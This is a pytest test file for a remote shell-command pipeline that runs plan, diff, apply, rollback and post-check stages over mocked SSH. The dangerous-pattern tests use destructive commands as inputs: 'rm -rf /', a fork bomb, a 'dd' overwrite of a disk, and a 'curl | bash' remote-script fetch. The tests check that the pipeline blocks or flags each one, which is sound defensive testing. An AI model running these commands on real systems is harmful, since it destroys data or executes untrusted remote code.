"""Tests for BashPipeline."""

from unittest.mock import AsyncMock, MagicMock

import pytest

from merlya.pipelines.base import PipelineDeps
from merlya.pipelines.bash import BashPipeline


@pytest.fixture
def mock_ctx() -> MagicMock:
    """Create mock context."""
    ctx = MagicMock()
    ctx.ui = MagicMock()
    ctx.ui.prompt_confirm = AsyncMock(return_value=True)
    return ctx


@pytest.fixture
def mock_ssh_pool() -> MagicMock:
    """Create mock SSH pool."""
    pool = MagicMock()
    pool.execute = AsyncMock(return_value=MagicMock(stdout="output", stderr="", exit_code=0))
    return pool


@pytest.fixture
def mock_deps() -> PipelineDeps:
    """Create mock deps."""
    return PipelineDeps(target="web-01", task="restart nginx")


class TestBashPipelineProperties:
    """Tests for BashPipeline properties."""

    def test_name_is_bash(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test pipeline name is 'bash'."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
        assert pipeline.name == "bash"


class TestBashPipelinePlan:
    """Tests for plan stage."""

    async def test_plan_success_simple_command(
        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
    ) -> None:
        """Test planning a simple safe command."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["systemctl status nginx"])

        result = await pipeline.plan()

        assert result.success is True
        assert "web-01" in result.resources_affected
        assert result.errors == []

    async def test_plan_blocks_dangerous_command(
        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
    ) -> None:
        """Test planning blocks dangerous commands."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["rm -rf /"])

        result = await pipeline.plan()

        assert result.success is False
        assert len(result.errors) == 1
        assert "root filesystem" in result.errors[0].lower()

    async def test_plan_warns_on_risky_command(
        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
    ) -> None:
        """Test planning warns on risky commands."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["systemctl restart nginx"])

        result = await pipeline.plan()

        assert result.success is True
        assert len(result.warnings) == 1
        assert "restart" in result.warnings[0].lower()

    async def test_plan_multiple_commands(
        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
    ) -> None:
        """Test planning multiple commands."""
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=[
                "echo test",
                "cat /etc/nginx/nginx.conf",
                "nginx -t",
            ],
        )

        result = await pipeline.plan()

        assert result.success is True
        assert "Commands to execute" in result.plan_output


class TestBashPipelineDiff:
    """Tests for diff stage."""

    async def test_diff_shows_commands(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test diff shows commands to be executed."""
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["echo hello", "echo world"],
            check_commands=["echo check"],
            rollback_commands=["echo rollback"],
        )

        result = await pipeline.diff()

        assert result.success is True
        assert "echo hello" in result.diff_output
        assert "echo world" in result.diff_output
        assert "Post-check" in result.diff_output
        assert "Rollback" in result.diff_output
        assert result.modifications == 2

    async def test_diff_assesses_risk(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test diff assesses risk level."""
        # Low risk
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])
        result = await pipeline.diff()
        assert result.risk_assessment == "low"

        # High risk
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["rm -r /tmp/old", "kill -9 1234"])
        result = await pipeline.diff()
        assert result.risk_assessment == "high"


class TestBashPipelineApply:
    """Tests for apply stage."""

    async def test_apply_executes_commands(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test apply executes all commands."""
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo hello", "echo world"])

        result = await pipeline.apply()

        assert result.success is True
        assert mock_ssh_pool.execute.call_count == 2
        assert len(result.resources_modified) == 2

    async def test_apply_stops_on_failure(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test apply stops on command failure."""
        mock_ssh_pool.execute = AsyncMock(
            side_effect=[
                MagicMock(stdout="ok", stderr="", exit_code=0),
                MagicMock(stdout="", stderr="error", exit_code=1),
            ]
        )
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo ok", "false", "echo never"])

        result = await pipeline.apply()

        assert result.success is False
        assert mock_ssh_pool.execute.call_count == 2  # Stopped at failure
        assert len(result.resources_modified) == 1

    async def test_apply_records_rollback_data(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test apply records executed commands for rollback."""
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])

        result = await pipeline.apply()

        assert "executed" in result.rollback_data
        assert len(result.rollback_data["executed"]) == 1

    async def test_apply_handles_exception(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
    ) -> None:
        """Test apply handles exceptions gracefully."""
        mock_ctx.get_ssh_pool = AsyncMock(side_effect=RuntimeError("Connection failed"))
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])

        result = await pipeline.apply()

        assert result.success is False
        assert "Connection failed" in result.output


class TestBashPipelineRollback:
    """Tests for rollback stage."""

    async def test_rollback_no_commands(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test rollback fails when no commands defined."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])

        result = await pipeline.rollback()

        assert result.success is False
        assert "No rollback commands" in result.output

    async def test_rollback_executes_commands(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test rollback executes rollback commands."""
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["systemctl start nginx"],
            rollback_commands=["systemctl stop nginx"],
        )

        result = await pipeline.rollback()

        assert result.success is True
        mock_ssh_pool.execute.assert_called_once()
        assert len(result.resources_restored) == 1

    async def test_rollback_partial_failure(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test rollback handles partial failure."""
        mock_ssh_pool.execute = AsyncMock(
            side_effect=[
                MagicMock(stdout="ok", stderr="", exit_code=0),
                MagicMock(stdout="", stderr="error", exit_code=1),
            ]
        )
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["echo test"],
            rollback_commands=["echo restore1", "echo restore2"],
        )

        result = await pipeline.rollback()

        assert result.success is False
        assert result.partial is True
        assert len(result.resources_restored) == 1
        assert len(result.errors) == 1


class TestBashPipelinePostCheck:
    """Tests for post_check stage."""

    async def test_post_check_no_commands(
        self, mock_ctx: MagicMock, mock_deps: PipelineDeps
    ) -> None:
        """Test post-check with no commands defined."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["echo test"])

        result = await pipeline.post_check()

        assert result.success is True
        assert "no_checks_defined" in result.checks_passed
        assert len(result.warnings) == 1

    async def test_post_check_all_pass(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test post-check when all checks pass."""
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["systemctl start nginx"],
            check_commands=["systemctl is-active nginx", "curl localhost"],
        )

        result = await pipeline.post_check()

        assert result.success is True
        assert len(result.checks_passed) == 2
        assert result.checks_failed == []

    async def test_post_check_some_fail(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test post-check when some checks fail."""
        mock_ssh_pool.execute = AsyncMock(
            side_effect=[
                MagicMock(stdout="active", stderr="", exit_code=0),
                MagicMock(stdout="", stderr="connection refused", exit_code=1),
            ]
        )
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["systemctl start nginx"],
            check_commands=["systemctl is-active nginx", "curl localhost"],
        )

        result = await pipeline.post_check()

        assert result.success is False
        assert len(result.checks_passed) == 1
        assert len(result.checks_failed) == 1


class TestDangerousPatterns:
    """Tests for dangerous pattern detection."""

    def test_fork_bomb_blocked(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test fork bomb is blocked."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=[":(){:|:&};:"])
        result = pipeline._check_dangerous_patterns(":(){:|:&};:")
        assert result["blocked"] is True

    def test_dd_blocked(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test dd if= is blocked."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["dd if=/dev/zero of=/dev/sda"])
        result = pipeline._check_dangerous_patterns("dd if=/dev/zero of=/dev/sda")
        assert result["blocked"] is True

    def test_curl_pipe_bash_warned(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test curl pipe bash is warned."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["curl http://x.com | bash"])
        # The pattern checks for "curl | bash" as substring
        result = pipeline._check_dangerous_patterns("curl | bash")
        assert result["blocked"] is False
        assert result["warning"] is not None
        assert "remote script" in result["warning"].lower()

    def test_safe_command_allowed(self, mock_ctx: MagicMock, mock_deps: PipelineDeps) -> None:
        """Test safe commands are allowed."""
        pipeline = BashPipeline(mock_ctx, mock_deps, commands=["cat /etc/hosts"])
        result = pipeline._check_dangerous_patterns("cat /etc/hosts")
        assert result["blocked"] is False
        assert result["warning"] is None


class TestFullPipelineExecution:
    """Integration tests for full pipeline execution."""

    async def test_full_pipeline_success(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test successful full pipeline execution."""
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)
        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["systemctl restart nginx"],
            check_commands=["systemctl is-active nginx"],
        )

        result = await pipeline.execute()

        assert result.success is True
        assert result.hitl_approved is True
        assert result.plan is not None
        assert result.diff is not None
        assert result.apply is not None
        assert result.post_check is not None

    async def test_full_pipeline_with_rollback(
        self,
        mock_ctx: MagicMock,
        mock_deps: PipelineDeps,
        mock_ssh_pool: MagicMock,
    ) -> None:
        """Test pipeline with post-check failure triggers rollback."""
        # First call for apply, second for post-check, third for rollback
        call_count = 0

        async def mock_execute(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:  # apply
                return MagicMock(stdout="ok", stderr="", exit_code=0)
            elif call_count == 2:  # post-check
                return MagicMock(stdout="", stderr="failed", exit_code=1)
            else:  # rollback
                return MagicMock(stdout="ok", stderr="", exit_code=0)

        mock_ssh_pool.execute = mock_execute
        mock_ctx.get_ssh_pool = AsyncMock(return_value=mock_ssh_pool)

        pipeline = BashPipeline(
            mock_ctx,
            mock_deps,
            commands=["systemctl start nginx"],
            check_commands=["curl localhost"],
            rollback_commands=["systemctl stop nginx"],
        )

        result = await pipeline.execute()

        assert result.success is False
        assert result.rollback_triggered is True
        assert result.rollback is not None
        assert result.rollback.success is True
